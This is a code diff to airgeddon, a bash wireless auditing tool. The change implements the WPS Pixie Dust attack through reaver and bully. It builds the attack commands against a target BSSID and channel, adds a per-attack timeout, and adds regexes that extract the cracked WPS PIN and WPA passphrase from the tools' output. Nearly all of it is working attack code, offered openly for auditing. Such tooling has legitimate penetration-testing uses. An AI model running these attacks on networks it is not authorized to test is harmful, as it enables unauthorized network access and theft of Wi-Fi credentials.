@@ -116,6 +116,7 @@ wps_default_generic_pin="12345670"
 wps_attack_script_file="ag.wpsattack.sh"
 wps_out_file="ag.wpsout.txt"
 timeout_secs_per_pin="12"
+timeout_secs_per_pixiedust="25"
 
 #Repository and contact vars
 github_user="v1s1t0r1sh3r3"
@@ -4629,12 +4630,14 @@ function exec_bully_pixiewps_attack() {
 	echo
 	language_strings "${language}" 32 "green"
 
+	set_wps_attack_script "bully" "pixiedust"
+
 	echo
 	language_strings "${language}" 33 "yellow"
 	language_strings "${language}" 366 "blue"
 	language_strings "${language}" 4 "read"
 	recalculate_windows_sizes
-	xterm -hold -bg black -fg red -geometry "${g2_stdright_window}" -T "WPS bully pixie dust attack" -e "bully ${interface} -b ${wps_bssid} -c ${wps_channel} -d -v ${bully_verbosity} && echo \"Close this window\"" > /dev/null 2>&1
+	xterm -hold -bg black -fg red -geometry "${g2_stdright_window}" -T "WPS bully pixie dust attack" -e "bash \"${tmpdir}${wps_attack_script_file}\"" > /dev/null 2>&1
 }
 
 #Execute reaver pixie dust attack
@@ -4643,12 +4646,14 @@ function exec_reaver_pixiewps_attack() {
 	echo
 	language_strings "${language}" 32 "green"
 
+	set_wps_attack_script "reaver" "pixiedust"
+
 	echo
 	language_strings "${language}" 33 "yellow"
 	language_strings "${language}" 366 "blue"
 	language_strings "${language}" 4 "read"
 	recalculate_windows_sizes
-	xterm -hold -bg black -fg red -geometry "${g2_stdright_window}" -T "WPS reaver pixie dust attack" -e "reaver -i ${interface} -b ${wps_bssid} -c ${wps_channel} -K 1 -vvv && echo \"Close this window\"" > /dev/null 2>&1
+	xterm -hold -bg black -fg red -geometry "${g2_stdright_window}" -T "WPS reaver pixie dust attack" -e "bash \"${tmpdir}${wps_attack_script_file}\"" > /dev/null 2>&1
 }
 
 #Execute wps bruteforce pin bully attack
@@ -6818,9 +6823,9 @@ function set_wps_attack_script() {
 			"pindb"|"custompin")
 				attack_cmd1="reaver -i \${script_interface} -b \${script_wps_bssid} -c \${script_wps_channel} -L -f -n -a -g 1 -d 2 -vvv -p "
 			;;
-			#"pixiedust")
-				#TODO pending
-			#;;
+			"pixiedust")
+				attack_cmd1="reaver -i \${script_interface} -b \${script_wps_bssid} -c \${script_wps_channel} -K 1 -vvv"
+			;;
 			"bruteforce")
 				attack_cmd1="reaver -i \${script_interface} -b \${script_wps_bssid} -c \${script_wps_channel} -L -f -n -a -d 2 -vvv"
 			;;
@@ -6831,9 +6836,9 @@ function set_wps_attack_script() {
 			"pindb"|"custompin")
 				attack_cmd1="bully \${script_interface} -b \${script_wps_bssid} -c \${script_wps_channel} -L -F -B -v ${bully_verbosity} -p "
 			;;
-			#"pixiedust")
-				#TODO pending
-			#;;
+			"pixiedust")
+				attack_cmd1="bully \${script_interface} -b \${script_wps_bssid} -c \${script_wps_channel} -d -v ${bully_verbosity}"
+			;;
 			"bruteforce")
 				attack_cmd1="bully \${script_interface} -b \${script_wps_bssid} -c \${script_wps_channel} -L -F -B -v ${bully_verbosity}"
 			;;
@@ -6867,6 +6872,10 @@ function set_wps_attack_script() {
 				script_attack_cmd1="${unbuffer}timeout ${timeout_secs_per_pin} ${attack_cmd1}"
 				pin_header1="${white_color}Testing PIN "
 			;;
+			"pixiedust")
+				script_attack_cmd1="${unbuffer}timeout ${timeout_secs_per_pixiedust} ${attack_cmd1}"
+				pin_header1="${white_color}Testing Pixie Dust attack${normal_color}"
+			;;
 			"bruteforce")
 				script_attack_cmd1="${unbuffer} ${attack_cmd1}"
 				pin_header1="${white_color}Testing all possible PINs${normal_color}"
@@ -6885,15 +6894,33 @@ function set_wps_attack_script() {
 
 	cat >&7 <<-'EOF'
 			if [ "${script_wps_attack_tool}" = "reaver" ]; then
-				failed_attack_regexp="^\[!\][[:space:]]WPS[[:space:]]transaction[[:space:]]failed"
-				success_attack_badpin_regexp="^\[\-\][[:space:]]Failed[[:space:]]to[[:space:]]recover[[:space:]]WPA[[:space:]]key"
-				success_attack_goodpin_regexp="^\[\+\][[:space:]]Pin[[:space:]]cracked"
-				pin_cracked_regexp="^\[\+\][[:space:]]WPS[[:space:]]PIN:[[:space:]]'([0-9]{8})'"
-				password_cracked_regexp="^\[\+\][[:space:]]WPA[[:space:]]PSK:[[:space:]]'(.*)'"
+				case ${script_wps_attack_mode} in
+					"pindb"|"custompin"|"bruteforce")
+						failed_attack_regexp="^\[!\][[:space:]]WPS[[:space:]]transaction[[:space:]]failed"
+						success_attack_badpin_regexp="^\[\-\][[:space:]]Failed[[:space:]]to[[:space:]]recover[[:space:]]WPA[[:space:]]key"
+						success_attack_goodpin_regexp="^\[\+\][[:space:]]Pin[[:space:]]cracked"
+						pin_cracked_regexp="^\[\+\][[:space:]]WPS[[:space:]]PIN:[[:space:]]'([0-9]{8})'"
+						password_cracked_regexp="^\[\+\][[:space:]]WPA[[:space:]]PSK:[[:space:]]'(.*)'"
+					;;
+					"pixiedust")
+						success_attack_badpixie_regexp="^\[Pixie\-Dust\].*\[\-\][[:space:]]WPS[[:space:]]pin[[:space:]]not[[:space:]]found"
+						success_attack_goodpixie_pin_regexp="^\[Pixie\-Dust\][[:space:]]*\[\+\][[:space:]]*WPS[[:space:]]pin:.*([0-9]{8})"
+						success_attack_goodpixie_password_regexp=".*?\[\+\][[:space:]]WPA[[:space:]]PSK:[[:space:]]'(.*)'"
+					;;
+				esac
 			else
-				failed_attack_regexp="^\[\+\][[:space:]].*'WPSFail'"
-				success_attack_badpin_regexp="^\[\+\][[:space:]].*'Pin[0-9][0-9]?Bad'"
-				success_attack_goodpin_regexp="^\[\*\][[:space:]]Pin[[:space:]]is[[:space:]]'([0-9]{8})',[[:space:]]key[[:space:]]is[[:space:]]'(.*)'"
+				case ${script_wps_attack_mode} in
+					"pindb"|"custompin"|"bruteforce")
+						failed_attack_regexp="^\[\+\][[:space:]].*'WPSFail'"
+						success_attack_badpin_regexp="^\[\+\][[:space:]].*'Pin[0-9][0-9]?Bad'"
+						success_attack_goodpin_regexp="^\[\*\][[:space:]]Pin[[:space:]]is[[:space:]]'([0-9]{8})',[[:space:]]key[[:space:]]is[[:space:]]'(.*)'"
+					;;
+					"pixiedust")
+						success_attack_badpixie_regexp="^\[Pixie\-Dust\][[:space:]]WPS[[:space:]]pin[[:space:]]not[[:space:]]found"
+						success_attack_goodpixie_pin_regexp="^\[Pixie\-Dust\][[:space:]]PIN[[:space:]]FOUND:[[:space:]]([0-9]{8})"
+						success_attack_goodpixie_password_regexp="^\[\*\][[:space:]]Pin[[:space:]]is[[:space:]]'[0-9]{8}',[[:space:]]key[[:space:]]is[[:space:]]'(.*)'"
+					;;
+				esac
 			fi
 
 			case ${script_wps_attack_mode} in
@@ -6929,9 +6956,21 @@ function set_wps_attack_script() {
 						fi
 					done
 				;;
-				#"pixiedust")
-					#TODO
-				#;;
+				"pixiedust")
+					for item in "${LINES_TO_PARSE[@]}"; do
+						if [[ ${item} =~ ${success_attack_goodpixie_pin_regexp} ]]; then
+							cracked_pin="${BASH_REMATCH[1]}"
+							pin_cracked=1
+							continue
+						elif [[ ${item} =~ ${success_attack_goodpixie_password_regexp} ]]; then
+							cracked_password="${BASH_REMATCH[1]}"
+							return 0
+						fi
+					done
+					if [ ${pin_cracked} -eq 1 ]; then
+						return 0
+					fi
+				;;
 				"bruteforce")
 					for item in "${LINES_TO_PARSE[@]}"; do
 						if [ "${script_wps_attack_tool}" = "reaver" ]; then
@@ -6963,10 +7002,20 @@ function set_wps_attack_script() {
 
 	cat >&7 <<-EOF
 		#Prints message for pins on timeout
-		function print_pin_timeout() {
+		function print_timeout() {
 
 			echo
-			timeout_msg="${white_color}Timeout for last PIN${normal_color}"
+	EOF
+
+	cat >&7 <<-'EOF'
+			if [ "${script_wps_attack_mode}" = "pixiedust" ]; then
+	EOF
+
+	cat >&7 <<-EOF
+				timeout_msg="${white_color}Timeout for Pixie Dust attack${normal_color}"
+			else
+				timeout_msg="${white_color}Timeout for last PIN${normal_color}"
+			fi
 	EOF
 
 	cat >&7 <<-'EOF'
@@ -6984,7 +7033,7 @@ function set_wps_attack_script() {
 					fi
 					bad_attack_this_pin_counter=0
 					if [ "${this_pin_timeout}" -eq 1 ]; then
-						print_pin_timeout
+						print_timeout
 					fi
 
 					echo
@@ -7059,15 +7108,26 @@ function set_wps_attack_script() {
 					fi
 				fi
 			;;
-			"bruteforce")
+			"pixiedust")
 				echo
 				echo -e "${pin_header1}"
 				if [ "${script_wps_attack_tool}" = "bully" ]; then
 					echo
 				fi
 
+				(set -o pipefail && eval "${script_attack_cmd1}${script_attack_cmd2}")
+				if [ "$?" = "124" ]; then
+					this_pin_timeout=1
+				fi
+				parse_output
+			;;
+			"bruteforce")
+				echo
+				echo -e "${pin_header1}"
+				if [ "${script_wps_attack_tool}" = "bully" ]; then
+					echo
+				fi
 				eval "${script_attack_cmd1}${script_attack_cmd2}"
-
 				parse_output
 			;;
 		esac
@@ -7079,17 +7139,22 @@ function set_wps_attack_script() {
 			echo
 			pin_cracked_msg="${white_color}PIN cracked: ${yellow_color}"
 			password_cracked_msg="${white_color}Password cracked: ${yellow_color}"
+			password_not_cracked_msg="${white_color}Password was not cracked: ${yellow_color}Maybe because bad/low signal, or PBC activated on AP"
 	EOF
 
 	cat >&7 <<-'EOF'
 			echo -e "${pin_cracked_msg}${cracked_pin}"
-			echo -e "${password_cracked_msg}${cracked_password}"
+			if [ -n "${cracked_password}" ]; then
+				echo -e "${password_cracked_msg}${cracked_password}"
+			else
+				echo -e "${password_not_cracked_msg}"
+			fi
 		fi
 
 		if [ "${this_pin_timeout}" -eq 1 ]; then
 	EOF
 	cat >&7 <<-EOF
-			print_pin_timeout
+			print_timeout
 		fi
 
 		echo
